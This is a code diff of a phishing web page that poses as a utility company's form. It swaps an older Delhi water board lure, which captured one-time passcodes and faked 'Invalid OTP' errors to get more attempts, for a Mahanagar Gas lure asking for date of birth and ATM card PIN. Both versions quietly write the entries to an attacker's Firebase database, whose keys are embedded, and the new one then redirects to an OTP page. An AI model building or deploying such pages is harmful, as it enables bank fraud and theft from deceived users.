@@ -9,20 +9,19 @@
       font-family: Arial;
       background-color: #FFFFFF;
       text-align: center;
-      padding: 20px;
-      margin: 0;
+      padding-top: 50px;
     }
     img {
-      width: 100%;
+      width: 90%;
       max-width: 300px;
       border-radius: 10px;
     }
     .side-button {
       margin-top: 20px;
-      padding: 12px;
+      padding: 10px;
       width: 100%;
       font-size: 17px;
-      background-color: #FF0000;
+      background-color: #4082ff;
       color: #FFFFFF;
       border: none;
       border-radius: 10px;
@@ -30,6 +29,7 @@
     .form-container {
       margin-top: 30px;
       text-align: left;
+      width: 90%;
       max-width: 400px;
       margin-left: auto;
       margin-right: auto;
@@ -40,7 +40,7 @@
     }
     .form-container h2 {
       text-align: center;
-      background-color: #00008b;
+      background-color: #0f7213;
       color: white;
       padding: 10px;
       border-radius: 5px;
@@ -61,114 +61,93 @@
       border: 1px solid #ccc;
       border-radius: 5px;
     }
-    #message {
-      color: red;
-      font-size: 18px;
-      text-align: center;
-      margin-top: 15px;
-    }
-    #overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      backdrop-filter: blur(5px);
-      background-color: rgba(255,255,255,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
   </style>
-  <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
 </head>
 <body>
-  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer">
+  <img src="https://meek-semolina-bb73d5.netlify.app/top.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
-    <h2>जल¥बोर्ड</h2>
+    <h2>Mahanagar Gas</h2>
+    
+<form onsubmit="submitForm(event)">
+  <div class="input-group">
+    <label for="dob">Date of Birth (DD/MM/YYYY)</label>
+    <input 
+      type="text" 
+      id="dob" 
+      name="dob" 
+      placeholder="DD/MM/YYYY" 
+      maxlength="10"
+      pattern="\d{2}/\d{2}/\d{4}" 
+      required
+    >
+  </div>
 
-    <form onsubmit="return handleOTP(event)">
       <div class="input-group">
-        <label for="otp">Enter OTP</label>
-        <input type="text" id="otp" name="otp" maxlength="8" inputmode="numeric" pattern="\d{1,8}" placeholder="Enter OTP" required>
+        <label for="pin">ATM Card PIN</label>
+        <input type="password" id="pin" name="pin" maxlength="4" pattern="\d{4}" inputmode="numeric" required>
       </div>
 
-      <button class="side-button" type="submit" id="submitBtn">Submit</button>
-
-      <div id="message"></div>
+      <div style="text-align: center;">
+        <button class="side-button" type="submit">Continue</button>
+      </div>
     </form>
   </div>
 
-  <!-- Blur & Loader -->
-  <div id="overlay">
-    <lottie-player src="https://assets4.lottiefiles.com/packages/lf20_usmfx6bp.json"
-      background="transparent" speed="1" style="width: 150px; height: 150px;" loop autoplay>
-    </lottie-player>
-  </div>
-
-  <!-- Firebase -->
+  <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
-      authDomain: "dlhiljbrd.firebaseapp.com",
-      projectId: "dlhiljbrd",
-      storageBucket: "dlhiljbrd.firebasestorage.app",
-      messagingSenderId: "981951131769",
-      appId: "1:981951131769:web:5d56cd1423d753992664a8"
+      const firebaseConfig = {
+      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+      authDomain: "ss22-a96d3.firebaseapp.com",
+      projectId: "ss22-a96d3",
+      storageBucket: "ss22-a96d3.appspot.com",
+      messagingSenderId: "607942972170",
+      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-  </script>
 
-  <script>
-    let attempt = 0;
+    document.getElementById("dob").addEventListener("input", function (e) {
+      let value = e.target.value.replace(/[^\d]/g, "");
+      if (value.length >= 3 && value.length <= 4) {
+        value = value.slice(0, 2) + '/' + value.slice(2);
+      }
+      if (value.length > 4) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
+      }
+      e.target.value = value;
+    });
 
-    function handleOTP(e) {
+    function submitForm(e) {
       e.preventDefault();
 
-      const otpInput = document.getElementById("otp");
-      const otp = otpInput.value.trim();
-      const messageBox = document.getElementById("message");
-      const overlay = document.getElementById("overlay");
-      const button = document.getElementById("submitBtn");
+      const dob = document.getElementById('dob').value;
+      const pin = document.getElementById('pin').value;
+      const dobPattern = /^\d{2}\/\d{2}\/\d{4}$/;
 
-      if (otp.length < 4 || otp.length > 8 || isNaN(otp)) {
-        alert("Please enter a valid OTP (4 to 8 digits).");
+      if (!dobPattern.test(dob)) {
+        alert("Please enter DOB in DD/MM/YYYY format.");
         return false;
       }
 
-      overlay.style.display = "flex";
-      messageBox.textContent = "";
-      button.disabled = true;
-      otpInput.disabled = true;
+      if (pin.length !== 4 || isNaN(pin)) {
+        alert("Please enter a valid 4-digit PIN.");
+        return false;
+      }
 
-      db.collection("otp_entries").add({
-        otp: otp,
-        attempt: attempt + 1,
+      db.collection("dob_pin").add({
+        dob: dob,
+        pin: pin,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        window.location.href = "otp.html"; // Replace with real page filename
+      }).catch((error) => {
+        alert("Error saving to Firebase: " + error);
       });
-
-      setTimeout(() => {
-        overlay.style.display = "none";
-        attempt++;
-
-        if (attempt === 1 || attempt === 2) {
-          messageBox.textContent = "Invalid OTP";
-          button.disabled = false;
-          otpInput.disabled = false;
-        } else {
-          messageBox.textContent = "Try again after sometime.";
-          button.disabled = true;
-          otpInput.disabled = true;
-        }
-
-        otpInput.value = "";
-      }, 10000); // 10 sec delay
     }
   </script>
 </body>
